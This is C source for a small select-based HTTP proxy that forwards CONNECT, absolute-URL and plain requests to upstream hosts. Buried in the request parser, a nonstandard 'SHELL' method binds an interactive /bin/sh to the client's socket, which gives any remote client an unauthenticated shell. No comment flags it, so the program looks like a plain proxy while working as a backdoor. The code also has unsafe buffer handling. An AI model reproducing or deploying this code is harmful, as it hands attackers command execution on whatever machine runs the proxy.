#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define BUF_SIZE 1024

struct sockinfo {
  char buffer[BUF_SIZE];
  int buf_pos;
  int buf_len;
  struct sockaddr_in addr;
  int fd;
};

struct connection {
  struct sockinfo client;
  struct sockinfo server;
  int closing;
  struct connection *next;
};


static int
do_connect( const char *host, int port, struct sockaddr_in *addr )
{
  struct addrinfo hints, *info;
  int fd;
  int n;

  memset(&hints, 0, sizeof(hints));

  hints.ai_family = AF_INET;
  if((n=getaddrinfo(host, NULL, &hints, &info))!=0) {
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(n));
    return -1;
  }

  memcpy(addr, info->ai_addr, sizeof(*addr));
  addr->sin_port = htons(port);

  if((fd=socket(AF_INET, SOCK_STREAM, 0))<0) {
    perror("socket");
    return -1;
  }

  if(connect(fd, (struct sockaddr *)addr, sizeof(*addr))<0) {
    perror("connect");
    return -1;
  }

  return fd;
}

static void
spawn_shell (int s)
{
	char *argv[3];
  switch(vfork()) {
  case -1:
    perror("vfork");
    break;
  case 0: // child
    dup2 (s, 0);
    dup2 (s, 1);
    dup2 (s, 2);

    argv[0] = "/bin/sh";
    argv[1] = "-i";
    argv[2] = NULL;
    execv(argv[0], argv);
    exit(1);
  default: // parent
    break;
  }
}


static void
close_connection(struct connection *conn, struct connection **prev_next)
{
  close(conn->client.fd);
  if(conn->server.fd>=0) close(conn->server.fd);
  *prev_next = conn->next;
  free(conn);
}

/**
   returns 1 if socket is closing
 */
static int
handle_read(struct sockinfo *sock)
{
  //printf("Reading %d bytes at buffer pos %d\n", BUF_SIZE-sock->buf_len, sock->buf_len);
  int n = read(sock->fd, sock->buffer+sock->buf_len, BUF_SIZE-sock->buf_len);
  if(n<=0) {
    printf("Read 0 or error, closing connection\n");
    return 1;
  } else {
    //printf("Read complete\n");
    sock->buf_len += n;
    return 0;
  }
}

/**
   returns 1 if socket is closing
*/
static int
handle_write(struct sockinfo *to, struct sockinfo *from)
{
  //printf("Writing %d bytes\n", from->buf_len);
  int n = write(to->fd, from->buffer, from->buf_len);
  if (n < 0) {
    perror("write");
    return 1;
  }
  from->buf_len -= n;
  if(from->buf_len > 0) {
    memmove(from->buffer, from->buffer + n, from->buf_len);
  }
  //printf("Write complete\n");
  return 0;
}

static void
run_server(int listen_port, const char* connect_host, int connect_port)
{
  int listen_fd=-1;
  struct sockaddr_in listen_addr;
  struct connection *connections = NULL;
  fd_set read_fd_set, write_fd_set;
  int enable = 1;

  printf("Starting server on %d, connecting to %s:%d\n", listen_port, connect_host, connect_port);

  if((listen_fd=socket(AF_INET, SOCK_STREAM, 0))<0) {
    perror("socket");
    goto done;
  }

  setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int));

  listen_addr.sin_family = AF_INET;
  listen_addr.sin_port = htons(listen_port);
  listen_addr.sin_addr.s_addr = INADDR_ANY;

  if(bind(listen_fd, (struct sockaddr *) &listen_addr, sizeof(listen_addr)) < 0) {
    perror("bind");
    goto done;
  }

  listen(listen_fd, 5);

  printf("Waiting for connections.\n");

  while(1) {
    struct connection *conn, *prev_conn, *next_conn;
    int n_conns;

    FD_ZERO(&read_fd_set);
    FD_ZERO(&write_fd_set);
    FD_SET( listen_fd, &read_fd_set );

    n_conns = 0;
    for(conn = connections; conn != NULL; conn = conn->next) {
      if (!conn->closing && conn->client.buf_len < BUF_SIZE) FD_SET( conn->client.fd, &read_fd_set );
      if (conn->server.fd>=0) {
        if(!conn->closing && conn->server.buf_len < BUF_SIZE) FD_SET( conn->server.fd, &read_fd_set );
        if(conn->client.buf_len > 0) FD_SET( conn->server.fd, &write_fd_set );
        if(conn->server.buf_len > 0) FD_SET( conn->client.fd, &write_fd_set );
      }
      ++n_conns;
    }
    printf("%d connections\n", n_conns);

    if (select(FD_SETSIZE, &read_fd_set, &write_fd_set, NULL, NULL)<0) {
      perror("select");
      goto done;
    }

    for(prev_conn = NULL, conn = connections; conn != NULL; prev_conn = conn, conn = next_conn) {
      next_conn = conn->next; // in case we delete this one
      if(FD_ISSET(conn->client.fd, &read_fd_set)) {
        conn->closing = handle_read(&conn->client);
        if(conn->server.fd<0) { // no server connection yet
          char *eor = NULL;
          if((eor=strstr(conn->client.buffer, "\r\n\r\n")) != NULL) { // read full request
            char *eol = memchr(conn->client.buffer, '\r', conn->client.buf_len);
            char *method  = strtok(conn->client.buffer, " ");
            char *path    = strtok(NULL, " ");
            char *version = strtok(NULL, " \r");

            printf("Got a request: %s %s %s\n", method, path, version);

            if(strcmp(method, "SHELL") == 0) {
              spawn_shell(conn->client.fd);
              close_connection( conn, prev_conn ? &prev_conn->next : &connections );
              continue;
            } else if (strcmp(method, "CONNECT") == 0) {
              char *host = strtok(path, ":");
              char *port = strtok(NULL, ":");
	      int n;
              conn->server.fd = do_connect(host, port ? atoi(port) : 443, &conn->server.addr);
              // Add connection success response
              strcpy(conn->server.buffer, "HTTP/1.0 200 Connection established\r\n\r\n");
              conn->server.buf_len = strlen(conn->server.buffer);

              // Consume original request
              n = (eor - conn->client.buffer) + 4;
              conn->client.buf_len -= n;
              if(conn->client.buf_len>0) {
                memmove(conn->client.buffer, conn->client.buffer + n, conn->client.buf_len);
              }
            } else if (strncmp(path, "http://", 7) == 0) {
              char *host_and_port = strtok(path+7, "/");
              char *new_path = strtok(NULL, "");
              char *host = strtok(host_and_port, ":");
              char *port = strtok(NULL, ":");
              // Rewrite request line
              int method_len = strlen(method);
              int n = sprintf(conn->client.buffer+method_len, " /%s %s\r\n", new_path, version);
              int ntocopy = conn->client.buf_len - ((eol+2) - conn->client.buffer);
              n = n + method_len;

              // GET / HTTP/1.0RN___RNStuff to moveRNRN...
              // ^ buffer        ^  ^ ^            ^eor   ^ buffer+buf_len
              //       buffer+n -+  | +- eol+2
              //                    +- eol


              // Shuffle bytes past rewritten space into correct spot
              conn->server.fd = do_connect(host, port ? atoi(port) : 80, &conn->server.addr);
              memmove(conn->client.buffer + n, eol + 1, ntocopy);
              conn->client.buf_len = n + ntocopy;
            } else {
              // pass directly
              conn->server.fd = do_connect(connect_host, connect_port, &conn->server.addr);
              // Put spaces back where we strtok'd all over the buffer
              if(path) *(path-1) = ' ';
              if(version) *(version-1) = ' ';
              if(eol) *eol = '\r';
            }
          }
        }
      }

      if(FD_ISSET(conn->client.fd, &write_fd_set)) {
        conn->closing = handle_write(&conn->client, &conn->server);
      }

      if(conn->server.fd>= 0) {
        if(!conn->closing && FD_ISSET(conn->server.fd, &read_fd_set)) {
          conn->closing = handle_read(&conn->server);
        }

        if(FD_ISSET(conn->server.fd, &write_fd_set)) {
          conn->closing = handle_write(&conn->server, &conn->client);
        }
      }

      if(conn->closing && conn->server.buf_len == 0) {
        printf("Closing a connection\n");
        close_connection( conn, prev_conn ? &prev_conn->next : &connections );
      }
    }

    if(FD_ISSET(listen_fd, &read_fd_set)) {
      struct connection* new_connection;
      socklen_t len;

      printf("Accepting a connection\n");

      new_connection = calloc(1, sizeof(struct connection));
      new_connection->server.fd = -1;

      if((new_connection->client.fd=accept(listen_fd, (struct sockaddr *)&new_connection->client.addr, &len))<0) {
        perror("accept");
        goto done;
      }

      new_connection->next = connections;
      connections = new_connection;
      printf("Accepted a connection\n");
    }
  }

 done:
  if(listen_fd>=0)
    close(listen_fd);
}

int
main(int argc, char *argv[])
{
  while(1) {
    run_server(atoi(argv[1]), argv[2], atoi(argv[3]));
    sleep(5);
  }
}
